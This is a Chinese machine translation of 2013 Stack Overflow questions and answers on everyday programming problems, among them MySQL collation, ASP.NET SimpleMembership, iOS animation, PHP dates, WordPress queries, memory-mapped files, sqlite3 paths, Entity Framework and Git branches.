* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-15T21:21:00.610

您需要指定包含要更改的表的数据库。你可以通过两种方式做到这一点：

1)

在您的 alter table commang 之前运行此命令：

```
USE `database_name`;
ALTER TABLE `tbl_name` CONVERT TO CHARACTER SET utf8 COLLATE utf8_general_ci; 
```

或 2)

```
ALTER TABLE `database_name`.`tbl_name` CONVERT TO CHARACTER SET utf8 COLLATE utf8_general_ci; 
```

# asp.net-mvc-4 - ASP.NET MVC 4 + SimpleMembershipProvider

> ID：14903462
> 
> 赞同：0
> 
> 时间：2013-02-15T21:18:11.877
> 
> 标签：asp.net-mvc-4, simplemembership

我的 MVC 应用程序在开发机器上运行良好，但是当我部署到生产服务器时，它总是会给出各种错误消息，例如：

> 在调用“WebSecurity”类的任何其他方法之前，您必须调用“WebSecurity.InitializeDatabaseConnection”方法。此调用应放置在站点根目录中的 _AppStart.cshtml 文件中。

WebMatrix.WebData 已将版本更改为 2.0 并将 Copy Local = true 设置为，我将这些行复制到 web.config 中：

```
<roleManager enabled="true" defaultProvider="SimpleRoleProvider">
 <providers>
  <clear/>
  <add name="SimpleRoleProvider" type="WebMatrix.WebData.SimpleRoleProvider,WebMatrix.WebData"/>
 </providers>
</roleManager>
<membership defaultProvider="SimpleMembershipProvider">
 <providers>
 <clear/>
 <add name="SimpleMembershipProvider" type="WebMatrix.WebData.SimpleMembershipProvider, WebMatrix.WebData" />
 </providers>
</membership> 
```

我不知道是什么原因。我需要帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:49:49.507

如果您正在使用 simpleMembership，我鼓励您查看此[BlogPost](http://blog.spontaneouspublicity.com/including-asp-net-simple-membership-tables-as-part-of-your-entity-framework-model)，这对我来说真的很有帮助，因为它可以让您控制所有成员表，并使它们**成为您的实体框架模型的一部分**

无论如何，在 MVC 项目的 Filters 目录中应该有一个`InitializeSimpleMembershipAttribute.cs`文件。转到该文件并执行以下操作：

```
if (!WebSecurity.Initialized)
            WebSecurity.InitializeDatabaseConnection("DefaultConnection", "UserProfile", "UserId", "UserName", autoCreateTables: true); 
```

并将其`Global.asax.cs`归档。这样，它将始终被初始化。同样在你这样做之后，不需要保留`InitializeSimpleMembershipAttribute.cs`，我建议你`[InitializeSimpleMembership]`取下你的`AcccountController`

# iphone - UIView 3D 变换最终帧位置

> ID：14903465
> 
> 赞同：0
> 
> 时间：2013-02-15T21:18:30.607
> 
> 标签：iphone, ios, core-animation

我有一个 UIView，它有一个 X 原点，使它离开屏幕右侧。然后，我用 CATransform3D 做一个关键帧动画：

```
[NSValue valueWithCATransform3D:CATransform3DMakeTranslation(-view.width, 0, 0)] 
```

问题是，动画完成后，视图的框架在视觉上处于正确的位置，但它仍然认为它不在屏幕上，所以我无法与之交互。记录它的 frame 属性也表明它在屏幕外，但从视觉上看，它不是。

动画的填充模式是`kCAFillModeForwards`，所以动画的最终值会保持不变。

这个问题的解决方法是什么，即在动画结束后与这个view交互，通知view它确实可见？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T02:34:19.983

更好的答案是使用 UIView 动画方法，如 animateWithDuration:animations:completion: （以及该方法的变体。）

这些方法让您可以在实际视图属性上制作动画，当动画完成时，视图位于其实际目标位置。

center 属性是移动视图的最简单方法。如果您应用了变换，则 frame 属性无效，但 center 属性对于读取和写入始终有效。

Core Animation 只会产生视图移动的错觉。动画发生在层树的仅显示副本上。您可以通过从图层的presentationLayer 中读取相同的属性来查询动画图层的属性。但是，视图对象不会在其明显位置响应用户交互。这些观点仍然认为它们在原来的位置。

正如另一张海报所说，一旦动画结束，您可以使用动画完成委托方法将视图移动到它的最终位置，但是要让 UIView 动画更简洁、更简单地为您做一些事情，这是很多繁琐的工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-16T04:18:55.543

您甚至可以在动画之前与视图进行交互吗？view.userInteractionEnabled 是否设置为 YES？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-16T01:52:12.017

`-animationDidStop:finished:`动画完成后，您可以使用 CAAnimation 委托方法来修复它：

```
- (void)animationDidStop:(CAAnimation *)anim finished:(BOOL)flag {
  ...
} 
```

# php - 处理 php mktime 和 date 时的奇怪结果

> ID：14903468
> 
> 赞同：0
> 
> 时间：2013-02-15T21:18:45.850
> 
> 标签：php, strtotime, mktime

我需要根据商店的营业时间加上偏移量来生成交货时间。正确生成了开放时间，并且正确生成了偏移量，但我似乎无法正确组合它们。我已经尝试了几种方法：

```
$open = array('open_hr' => 14, 'open_min' => 0);

$tmpTime = mktime($open['open_hr'], $open['open_min']);
$openTime = date('G:i', $tmpTime);

$tmpOffset = 90; //in minutes
$tmpOpenWithOffset = $tmpTime + $tmpOffset * 60;
$finalTime = date('G:1', $tmpOpenWithOffset);

echo "open time: " . $openTime . "; offset in minutes: " .$tmpOffset . "; final time: " .$finalTime; 
```

结果是：

> 开放时间：14:00；以分钟为单位的偏移量：90；最后时间：15:1

我预计将 90 分钟添加到 14:00 将导致 15:30。

我也试过这样：

```
$open = array('open_hr' => 14, 'open_min' => 0);
$tmpTime = mktime($open['open_hr'], $open['open_min']);
$openTime = date('G:i', $tmpTime);

$tmpOffset = 90;
$finalTime = strtotime('+'.$tmpOffset . ' minutes', $openTime);

echo "open time: " . $openTime . "; offset in minutes: " .$tmpOffset . "; final time: " .$finalTime; 
```

这导致：

```
open time: 14:00; offset in minutes: 90; final time: 5414 
```

我也尝试过使用`eval`来评估 的第一个参数`strtotime`，如下所示：

```
$open = array('open_hr' => 14, 'open_min' => 0);
$tmpTime = mktime($open['open_hr'], $open['open_min']);
$openTime = date('G:i', $tmpTime);

$tmpOffset = 90;
$tmpStr = eval('+'.$tmpOffset . ' minutes');
$finalTime = strtotime($tmpStr, $openTime);

echo "open time: " . $openTime . "; offset in minutes: " .$tmpOffset . "; final time: " .$finalTime; 
```

这导致：

```
Parse error: syntax error, unexpected $end in /t.php(7) : eval()'d code on line 1
open time: 14:00; offset in minutes: 90; final time: 
```

同样，期望的结果是 14:00 加上 90 分钟将返回 15:30。我在这里做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:29:19.630

错字：

```
$finalTime = date('G:1', $tmpOpenWithOffset); 
```

当您采用第一个解决方案时，将 I 替换为 1 应该可以解决您的问题

# custom-post-type - 如何在 WordPress 中通过自定义帖子类型值进行查询？

> ID：14903472
> 
> 赞同：0
> 
> 时间：2013-02-15T21:18:57.643
> 
> 标签：custom-post-type, wordpress

我有一个`Custom Post Type`使用`Custom Post Type UI`名为`Case Studies`. 我还使用`Custom Fields`向.`capability``Case Studies`

如何查询等于某个 ID`Case Studies`的位置？`capability`

`$query = array('post_type' => 'case-studies','posts_per_page' => 3);`

到目前为止我的查询是

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T21:41:39.443

它可能是

```
$query = array(
    'post_type' => 'case-studies',
    'meta_key' => 'capability',
    'meta_value' => 10, // some ID
    'posts_per_page' => 3
);

$the_query = new WP_Query( $query );
while ( $the_query->have_posts() ) : $the_query->the_post();
    // echo here
endwhile;
wp_reset_postdata(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:40:27.993

您需要将您的密钥设置为功能，然后通过您的帖子 ID 查询值。

```
'meta_query' => array(
  array(
    'key' => 'capability',
    'value' => $post->ID,
    'compare' => 'example'
  )
) 
```

# c++ - 使用 Boost 的 file_mapping 和 mapped_region 最小化内存使用？

> ID：14903474
> 
> 赞同：2
> 
> 时间：2013-02-15T21:19:08.257
> 
> 标签：c++, memory-management, boost, file-io

对于这个问题，我将一个大的三维体积从文件加载到程序中，但通常一次只需要查看三个平面 (x,y,z)。我目前正在使用 Boost::Interprocess::File_Mapping 来创建文件的映射（32 GB）并将其加载到具有 24 GB RAM 的系统上。当前方法对文件使用单个 Boost::Interprocess::Mapped_Region。内存使用率迅速接近 99%。

我是内存映射文件 i/o 领域的新手，想知道如何最好地对文件进行分段以减少内存使用量。创建缩小尺寸的区域（例如每个 Z 平面）会改善结果吗？我想使用尽可能少的内存而不会造成不利影响。

我是否以正确的方式进行此操作，还是有更直接的方法来执行此操作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T16:55:57.537

在 Windows 上，它通常可以正常工作。我创建了一个测试应用程序（对不起，我讨厌 boost，因为我认为它的质量令人震惊，我的示例使用 ATL，但底层 Windows API 是相同的）：

```
HRESULT TestMain( LPCTSTR strFileName )
{
    CAtlFile file;
    HRESULT hr = file.Create( strFileName, GENERIC_READ, FILE_SHARE_READ, OPEN_EXISTING );
    if( FAILED( hr ) )
        return hr;
    CAtlFileMapping<BYTE> mapping;
    hr = mapping.MapFile( file );
    if( FAILED( hr ) )
        return hr;
    size_t sz = mapping.GetMappingSize();
    BYTE res = 0;
    for( size_t i = 0; i < sz; i++ )
        res ^= mapping[ i ];

    printf( "Read the complete file, %Iu bytes, the XOR is %.2X\n", sz, int( res ) );
    return S_OK;
} 
```

当被要求在具有 8GB RAM 的机器上读取 12GB 文件时，我看到了您所描述的效果（我的进程的资源监视器内存数据：提交 25 MB，私有 20 MB，工作集和可共享 6.5 GB，这是我的数量空闲内存）。然而，互联网上的多个消息来源说这些数字没有任何意义并且不会影响性能，因为一旦任何进程请求更多内存，未使用的物理页面就会被丢弃，而且这个进程非常便宜（当然除非你正在写你的内存映射文件）。

或者，如果您对此行为真的不满意，您可以通过调用 VirtualUnlock 自己释放未使用的部分，如下所述：[https ://stackoverflow.com/a/1882478/126995](https://stackoverflow.com/a/1882478/126995)

或者，您只能映射您需要的文件部分。

但是您可以做的最好的事情是优化数据的布局。如果在您的数据文件中您将体素保留为`double voxels[x][y][z]`，请将它们存储为`struct { double voxels[8][8][8] } blocks[x/8][y/8][z/8]`。这样，块大小正好是 4kb，也就是一个页​​面大小，如果你只需要访问例如 XZ 平面，你将节省**大量**的 I/O 带宽，数量级。只是不要搞砸错位，即如果您在数据之前有一个标题，请确保标题的大小是 4kb*n 其中 n 是整数。

# jquery - Twitter Bootstrap 弹出框消失得太快

> ID：14903476
> 
> 赞同：0
> 
> 时间：2013-02-15T21:19:17.477
> 
> 标签：jquery, ajax, twitter-bootstrap, opencart

我正在使用 Twitter Bootstrap 弹出框创建“快速查看”效果，以便在人们将鼠标悬停在项目上时显示更多信息。弹出框的内容来自 Ajax 调用。

下面的代码在第一次悬停时工作正常；但是，在随后的鼠标悬停时，弹出框消失得太快，并且不允许您查看内容。

任何人都可以弄清楚问题可能是什么？

```
$(document).ready(function(){
    //Quick view boxes
    var overPopup = false;

    $("a[rel=popover]", '.favorites').popover({
        trigger: 'manual',
        placement: 'bottom',
        html: true,
        content: function(){
            var div_id =  "div-id-" + $.now();
            return details_in_popup(div_id, $(this).data('product-id'));
        }

    }).mouseover(function (e) {
        // when hovering over an element which has a popover, hide
        // them all except the current one being hovered upon
        $('[rel=popover]').not('#' + $(this).data('unique')).popover('hide');
        var $popover = $(this);
        $popover.popover('show');

        $popover.data('popover').tip().mouseenter(function () {
            overPopup = true;
        }).mouseleave(function () {
            overPopup = false;
            $popover.popover('hide');
        });

    }).mouseout(function (e) {
        // on mouse out of button, close the related popover
        // in 200 milliseconds if you're not hovering over the popover
        var $popover = $(this);
        setTimeout(function () {
            if (!overPopup) {
                 $popover.popover('hide');
            }
        }, 200);
    });
});

function details_in_popup(div_id, product_id){
    $.ajax({
        url: 'index.php?route=product/product/get_product_ajax',
        type: 'post',
        data: 'product_id=' + product_id,
        dataType: 'json',
        success: function(json){
            if (json['success']) {
                $('#' + div_id).html(json['success']);
            }

        }
    });
    return '<div id="'+ div_id +'">Loading...</div>';
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T05:35:04.807

更改`.not('#' + $(this).data('unique'))`以`.not('[data-unique="' + $(this).data('unique') + '"]')`解决问题。

我不确定为什么会存在这个问题，但我知道如果从等式中删除“bootstrap-transition.js”，问题也会消失。

# java - 将可点击的 JPanel 添加到 AbstractTableModel

> ID：14903486
> 
> 赞同：0
> 
> 时间：2013-02-15T21:19:57.027
> 
> 标签：java, swing, hyperlink, tablecellrenderer

我有一个扩展 AbstractTableModel 的类，我想在其中一个单元格中插入一个带有可点击文本（想想超链接）的 JPanel。这可能吗？目前在我的单元格中使用 JPanel 的输出看起来像“javax.swing.JPanel[,0,0,0x0,invalid,layout=java.awt.FlowLayout,ali...” 我在其他地方使用过相同类型的 JLabel我的应用程序打开新标签并希望在我的表中具有相同类型的操作。

```
 public Object getValueAt(int row, int column) {
           if (row >= getRowCount()) return "???";
           switch (column) {
                  case 1:
                        return "???"
                  case 2:
                        return myJPanel;
                  case 3:
                        return "?" ;
                  case 4:
                        return new Integer(2);
                  default:
                        return "???" ;
          }
   } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T22:33:02.753

这不是表格模型的工作方式。表模型模型数据。它们将信息返回给视图的结构和数据类型。

使用这些信息并决定如何显示它取决于视图。

您所追求的是表格单元格渲染器和编辑器的角色。

查看[如何使用表格](http://docs.oracle.com/javase/tutorial/uiswing/components/table.html)了解更多详细信息

# c# - 在 IE 中查看 PDF，回击导航回 2 页

> ID：14903487
> 
> 赞同：3
> 
> 时间：2013-02-15T21:19:56.790
> 
> 标签：c#, asp.net, internet-explorer

使用 c# 对 asp.net 来说有点新。在我的网站上，用户可以选择在浏览器窗口中查看 pdf。pdf 数据存储在 SQL 数据库中，我使用以下代码：

```
Byte[] bytes = (Byte[])dt.Rows[0]["ContentData"];
    Response.ClearHeaders();
    Response.Clear();
    Response.AddHeader("Content-Type", "application/pdf");
    Response.AddHeader("Content-Length", bytes.Length.ToString());
    Response.AddHeader("Content-Disposition", "inline; filename=" + dt.Rows[0]    ["FileName"].ToString());
    Response.BinaryWrite(bytes);
    Response.Flush();
    HttpContext.Current.ApplicationInstance.CompleteRequest(); 
```

我只在 Internet Explorer 中遇到的问题是当用户点击后退按钮时，它会向后导航 2 页。这并不重要，但对用户来说很烦人。如果有人问过这个问题，我深表歉意，但我在想出搜索词来查找问题时遇到了麻烦。

任何帮助表示赞赏。谢谢。

cs新手

# php - 如何输出输入中引号的值？

> ID：14903488
> 
> 赞同：0
> 
> 时间：2013-02-15T21:19:59.570
> 
> 标签：php, input, output

我有代码

```
$name = 'Test world \"Example\" end';
<input type="text" name="text"  value="'.$name.'"> 
```

但在输入页面上的输入中，我`Test world \`只看到。

在 furebug 我看到输入中的完整代码：

```
<input type="text" name="text"  value="Test world "Example" end"> 
```

结果，我看到该报价比必要的更早关闭。

请告诉我如何做出正确的结果（结果应该带有报价）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:21:12.520

```
$name = 'Test world \"Example\" end';
echo '<input type="text" name="text"  value="'.htmlspecialchars($name,ENT_QUOTES).'">'; 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-02-15T21:22:03.633

`$name = 'Test world \\"Example\\" end'; <input type="text" name="text" value="'.$name.'">`

要么，要么编码那些斜线。

# jquery - 通过 Ajax Jquery 将 JsonMessage 添加到 RabbitMQ

> ID：14903490
> 
> 赞同：1
> 
> 时间：2013-02-15T21:20:02.600
> 
> 标签：jquery, ajax, node.js, rabbitmq

我想知道你们中是否有人通过 AJax Jquery 向 RabbitMQ 添加消息。我有.Net Helper，它添加了相同的内容。但我想知道如何通过 Ajax 做到这一点。

所有客户端应用程序都应该登录到 RabbitMQ ，以便 Node 可以读取并处理它并将消息传递给其他一些客户端。

任何参考链接都会很棒

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T00:06:02.207

我不太确定我是否理解您的问题，但这可能是您正在寻找的： [https ://github.com/squaremo/rabbit.js](https://github.com/squaremo/rabbit.js)

# c++ - 为什么文件路径长时 CFileDialog::GetNextPathName 不起作用？

> ID：14903496
> 
> 赞同：7
> 
> 时间：2013-02-15T21:20:36.077
> 
> 标签：c++, winapi, mfc, path, cfiledialog

使用`CFileDialog`类，我选择放置在具有长路径的目录中的多个文件。只选择一两个文件就可以了；但是当我同时选择三个文件时，它只返回第三个文件路径的一部分。（看起来可能限制为 512 个字符）我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-15T21:31:29.610

MFC 使用大小的默认缓冲区，`_MAX_PATH`这就是您看到该行为的原因。查看`dlgfile.cpp`执行，`CFileDialog::CFileDialog`您将看到`m_ofn.lpstrFile`并`m_ofn.nMaxFile`设置。

如果需要，您可以指定更大的缓冲区。在调用之前，`DoModal`您可以访问`CFileDialog::m_pOFN`成员以获取指向将使用的指针`OPENFILENAME`并`CFileDialog`直接更新它，或者调用`CFileDialog::GetOFN`以获取对结构的引用并更新它。

无论哪种方式，您都会发现这很有帮助： http: [//msdn.microsoft.com/en-US/library/ms646839 (v=vs.80).aspx](http://msdn.microsoft.com/en-US/library/ms646839(v=vs.80).aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-11-22T17:50:43.997

假设您的代码如下所示：

```
CFileDialog dialog(...);
dialog.DoModal(); 
```

* * *

确定您希望支持的最大文件数，例如：

```
#define MAX_FILE_NAMES 256 
```

* * *

在调用之前添加`DoModal`：

```
CString data;
dialog.m_pOFN->nMaxFile = (MAX_FILE_NAMES*(MAX_PATH+1))+1;
dialog.m_pOFN->lpstrFile = data.GetBuffer((MAX_FILE_NAMES*(MAX_PATH+1))+1); 
```

* * *

调用后添加`DoModal`：

```
data.ReleaseBuffer(); 
```

# python - 使用python 2.7查询sqlite3数据库并得到“sqlite3操作错误没有这样的表”

> ID：14903497
> 
> 赞同：2
> 
> 时间：2013-02-15T21:20:37.287
> 
> 标签：python, sqlite

下面列出了我的简单测试代码。我已经创建了表，并且可以使用 Firefox 上的 SQLite 管理器插件对其进行查询，因此我知道表和数据存在。当我在 python 中运行查询（并使用 python shell）时，我得到 no such table 错误

```
def TroyTest(self, acctno):

    conn = sqlite3.connect('TroyData.db')
    curs = conn.cursor()

    v1 = curs.execute('''
    SELECT acctvalue 
    FROM balancedata
    WHERE acctno = ? ''', acctno)
    print v1  
    conn.close() 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-02-15T21:23:30.610

当您向 SQLite 传递一个不存在的路径时，它会很高兴地为您打开一个*新*数据库，而不是告诉您该文件以前不存在。当你这样做时，它会是空的，你会得到一个“没有这样的表”错误。

您正在使用数据库的相对路径，这意味着它将尝试在*当前*目录中打开数据库，而这可能不是您认为的位置..

补救方法是改用绝对路径：

```
conn = sqlite3.connect('/full/path/to/TroyData.db') 
```

您需要在光标上循环查看结果：

```
curs.execute('''
    SELECT acctvalue 
    FROM balancedata
    WHERE acctno = ? ''', acctno)

for row in curs:
    print row[0] 
```

或致电`fetchone()`：

```
print curs.fetchone()  # prints whole row tuple 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-03-16T14:41:54.217

The problem is the SQL statment. you must specify the db name and after the table name...

'''SELECT * FROM **db_name.table_name** WHERE acctno = ? '''

# java - Jackson 和 Hibernate 验证器

> ID：14903498
> 
> 赞同：0
> 
> 时间：2013-02-15T21:20:39.313
> 
> 标签：java, json, jackson, hibernate-validator

是否有任何在线教程可用于将 Hibernate 验证器与 Jackson 一起用于验证 JSON？我现在使用 Spring 和 Jackson 进行 JSON 解析。在 Spring 中，我使用 MappingJacksonHttpMessageConverter 将传入的 JSON 有效负载自动转换为 Java 对象。

我想向 Java 类添加验证器注释。例如，如果我将“名称”作为字段之一的 Person 类，如果“名称”元素出现 1 次，我想验证 JSON 有效负载。如果它在有效负载中出现超过 1 次，那么我希望验证器启动以拒绝请求。

现在我观察到的是，如果有效载荷中有多个名称，Jackson 会忽略并选择最后一个。

Java 对象不绑定到任何 XML 模式等。

验证 JSON 的最佳实践是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:33:53.123

Spring 内置了 JSR-303 支持，请参阅[参考手册中的](http://static.springsource.org/spring/docs/3.1.x/spring-framework-reference/html/validation.html#validation-beanvalidation)这一章。

如果您使用的是 Spring MVC，请参见[此处](http://static.springsource.org/spring/docs/3.1.x/spring-framework-reference/html/validation.html#validation-mvc-configuring)，您应该能够`@RequestMapping`使用`@Valid`.

# android - 如何使用 android 为收据打印机生成文档

> ID：14903499
> 
> 赞同：-1
> 
> 时间：2013-02-15T21:20:41.093
> 
> 标签：android

好的，开始吧，我要开发一个应用程序，它必须允许支付电费和水费，当然它应该在交易结束时生成收据，我特别需要知道如何传输数据并确定什么将显示在收据上。我浏览了这个论坛，发现了一些 StarIO android sdk，知道我的英语很差，而且我很难弄清楚 starIO 的文档中发生了什么，我想知道是否StarIO 的软件包是我在这个应用程序中所需要的，或者我只是误解了它背后的目标。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:29:26.153

好吧，如果您必须使用 Star 打印机，那么是的，他们的 SDK 就是您要走的路。但是，如果不是，我们需要更多详细信息才能完全回答您的问题。

# asp.net-mvc - Asp.Net Mvc Checkboxfor 默认值？

> ID：14903500
> 
> 赞同：4
> 
> 时间：2013-02-15T21:20:43.810
> 
> 标签：asp.net-mvc, checkbox

模型

```
[DefaultValue(true)]
public bool IsActive { get; set; } 
```

看法

```
@Html.CheckBoxFor(model => model.IsActive) 
```

html 输出，这是我的预期

```
<input data-val="true" data-val-required="Yayında alanı boş bırakılmamalıdır!" id="IsActive" name="IsActive" type="checkbox" value="true" class="valid"> 
```

但未选中复选框。我不明白为什么？我错过了什么？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:23:32.483

根据[MSDN](http://msdn.microsoft.com/en-us/library/system.componentmodel.defaultvalueattribute.aspx)

> > DefaultValueAttribute 不会导致成员使用属性值自动初始化。您必须在代码中设置初始值。

# ios - 我可以使用 viewDidLoad 之外的情节提要在 iPhone 应用程序中初始化某些内容吗？

> ID：14903503
> 
> 赞同：0
> 
> 时间：2013-02-15T21:20:56.620
> 
> 标签：ios, storyboard

我有一个由两个视图控制器组成的 iPhone 应用程序；一个主要的，一个带有帮助屏幕的。每个都有一个按钮，可以执行从一个到另一个的 segue。

我遇到的问题是，当我从帮助屏幕回到主屏幕时，主视图控制器的 viewDidLoad 方法被调用，所以我在应用程序第一次启动时所做的所有初始化都会重复。视图控制器中是否有另一种方法只被调用一次，我可以在哪里进行初始化？

我的第一个想法是，“有一个最初设置为 false 的布尔变量，然后让 viewDidLoad 对其进行测试，如果它是 false，则进行初始化，然后将其设置为 true” - 但是如何在第一名？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:29:08.003

我的猜测是您正在执行“推送”转场（这是在 iOS 应用程序中可以执行的最标准的转场），如果您使用“推送”转场，则意味着您的导航控制器中有一个应用程序。

*最好*的办法是不要将另一个“主”视图控制器推送到其他视图控制器的堆栈上（这就是为什么`viewDidLoad`每次推送主视图时都会看到“”调用），而是当您单击“执行”时到帮助屏幕中的“主”按钮，*弹出*帮助屏幕并返回上一个。执行此操作的调用是 UINavigationController 的[`popViewControllerAnimated`](http://developer.apple.com/library/ios/documentation/UIKit/Reference/UINavigationController_Class/Reference/Reference.html#//apple_ref/occ/instm/UINavigationController/popViewControllerAnimated%3a)方法。

这样做意味着`viewDidLoad`该视图控制器上的“”只被调用一次，因为主视图被加载一次。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:28:53.780

在 .m 类文件上创建一个布尔值`@implementaition`：

```
@implementation yourClass{

    bool initialize = 0;
} 
```

然后在视图上测试它确实加载：

```
-(void)viewDidLoad{

    if(initialize == 0){

    //do everything you need to do

    initialize = 1;

    }
} 
```

我认为它会工作...

# entity-framework - 我可以用 Fluent Api 替换其中的一些吗？

> ID：14903509
> 
> 赞同：1
> 
> 时间：2013-02-15T21:21:24.277
> 
> 标签：entity-framework, ef-code-first

假设我在一个类中有以下属性（我使用 Code First）：

```
[Required]
[StringLength(100, ErrorMessage = "The {0} must be at least {2} characters long.", MinimumLength = 6)]
[DataType(DataType.Password)]
[Display(Name = "Password")]
public string Password { get; set; } 
```

我不想用这些注释来装饰我的 Password 属性。如果可能的话，我宁愿使用 Fluent Api。使用 Fluent Api 可以完成多少个注释？我知道Required可以和StringLength。但我不知道ErrorMessage、DataType 和Display。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-17T12:11:21.583

我采取的观点：

a)**用真正有用的业务约束来装饰 POCO**。MVC 和 EF 等将为您检查一些重要的约束。

b)**您可以并且应该向 POCO 添加对自定义注释或其他业务规则的检查。** 如果有兴趣，请参阅示例：

c) **DB 特定注释属于 EF fluent API。** 如果它们是特定于数据库的，在我看来不属于 POCO。例如表名、模式、外键、关联映射、列重命名和忽略等。

d)**错误消息和显示文本属于模型视图**。或者至少从下面的 POCO 示例中抽象出来。我知道人们不喜欢加倍努力，并且会使用 POCO 作为模型视图，并且喜欢简单的文本和错误消息处理。但我更喜欢多语言和可配置的完整错误消息/文本处理解决方案。在我看来，在 POCO 上粘贴文本并不是最好的解决方案。

显然风格和建筑尺寸会影响选择，许多人会不同意 d) 我对此没有什么大问题。我拍摄了一张大图设计模式视图，并在有意义的地方进行了分离和抽象。

这里有一点 POCO 额外样本，没有注释，但它本来可以。我也看到了一些带有注释的好例子。这种错误风格可以在 MVC 中使用，并且在我看来比注释中的文本更好。

```
 public class POCODemo : IValidatableObject //various ways to trigger this. Some for free

    /// poco members .... bla bla

   //Support Business rules...
    public override IEnumerable<ValidationResult> Validate(ValidationContext validationContext)
    {
        var vResult = base.Validate(validationContext).ToList();

        if (Poco.property1 || poco.property is nasty or xyz issue)//psuedo code for your check

                var memberList = new List<string> { "PropertyName1" };
                var err = new ValidationResult("Some Text comes from your TEXTPOOL of choice that explains the error", memberList);
                vResult.Add(err);
           // }

        }

        return vResult;
    } 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-15T21:48:07.933

> 我知道Required可以和StringLength。

就这样。

请记住，不同的“框架”可以使用相同的属性并且用于非常不同的目的。例如，如果您`Required`在 ASP.NET MVC 的上下文中使用该属性，它将用于 MVC 模型验证——在客户端由一些 Javascript 注入页面或在服务器端进行设置`ModelState.IsValid`。

Entity Framework Code-First 也使用该`Required`属性来验证实体，但这实际上与 MVC 模型验证无关。如果您`Required`使用 Fluent API 通过配置替换属性，您仍然会影响 Entity Framework，但对于 ASP.NET MVC，您只是删除了该属性，即 MVC 验证不再需要该属性。ASP.NET MVC 不关心 Entity Framework 的 Fluent API。

对于`StringLength`. `ErrorMessage`，`DataType`并且`Display`在 Entity Framework 中没有任何作用，既不是属性，也不是 Fluent API 中的对应物。

# r - 在 R 中导出月份名称时出错

> ID：14903511
> 
> 赞同：2
> 
> 时间：2013-02-15T21:21:54.423
> 
> 标签：r, ggplot2, monthcalendar

以下数据显示了我的项目、时间框架及其阶段。我想使用如下所示的 R ggplot() 代码可视化这些数据。但是，正如我们在下面看到的，在从数据中推断月份时出现错误。我想使用 Months 的名称作为 x 轴标签。此外，除了矩形框外，我还需要打印项目的名称。请帮助我。谢谢你。

```
> temp
  projects     starts       ends order     Phase
      A 2013-02-15 2013-03-15     1  Research
      A 2013-03-16 2013-04-15     1 Prototype
      B 2013-04-07 2013-04-30     2  Research
     B 2013-05-01 2013-08-30     2 Prototype
      C 2013-05-01 2013-07-30     3  Research
      D 2013-05-01 2013-07-30     4  Research

> a = ggplot(temp, aes(xmin = starts, xmax = ends, ymin = order, ymax = order+0.5)) + geom_rect(aes(fill=Phase), color="black") + theme_bw()
> b = a + geom_text(aes(x= starts + (ends-starts)/2 ,y=order+0.25, label=projects)) 
> b
Error in unit(x, default.units) : 'x' and 'units' must have length > 0
In addition: Warning messages:
1: In Ops.factor(ends, starts) : - not meaningful for factors
2: In Ops.factor(starts, (ends - starts)/2) : + not meaningful for factors
3: Removed 6 rows containing missing values (geom_text). 
```

另请参阅 R 的版本。

```
> version
               _                            
platform       i686-pc-linux-gnu            
arch           i686                         
os             linux-gnu                    
system         i686, linux-gnu              
status                                      
major          2                            
minor          15.2                         
year           2012                         
month          10                           
day            26                           
svn rev        61015                        
language       R                            
version.string R version 2.15.2 (2012-10-26) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T21:33:13.620

尝试转换`starts`和`ends``Date`

```
 temp$starts <- as.Date(temp$starts)
 temp$ends   <- as.Date(temp$ends) 
```

如果这不起作用，您可能需要使用`dput(temp)`并将其粘贴到您的问题中。

* * *

复制+粘贴OP的数据，转换为日期，然后使用OP的代码 ![使用上面的 ggplot2 代码](../Images/693210ff4af6515463266d3b893c1013.png)

# git - 拉取请求成功后在 Git 中更改分支和删除分支

> ID：14903516
> 
> 赞同：3
> 
> 时间：2013-02-15T21:22:11.173
> 
> 标签：git, github

我从master创建了一个分支`"newbranch"`，然后推回原点。然后，我创建了一个拉取请求，该请求被接受并合并到 master 中。

在这一点上，我应该从我的本地删除`"newbranch"`并从 master 中重新提取以开始处理新的东西吗？

在一个分支被接受为 master 之后，正确的流程是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T22:17:34.210

2013 年 4 月更新：

请参阅“[重新设计的合并按钮](https://github.com/blog/1469-redesigned-merge-button)”和“[在 GitHub 上提出拉取请求后，您如何处理您的分支？](https://stackoverflow.com/a/15970467/6309) ”：

**分支现在已为您删除**

![新的合并按钮](../Images/68b16066264a49b0b1a1f04e01e4114e.png)

* * *

原始答案（2013 年 2 月）

博文“ [Tidying up after Pull Requests](https://github.com/blog/1335-tidying-up-after-pull-requests) ”更加明确：

> 唯一的麻烦是，在合并或关闭合并请求后，我们最终会得到很多已失效的分支。
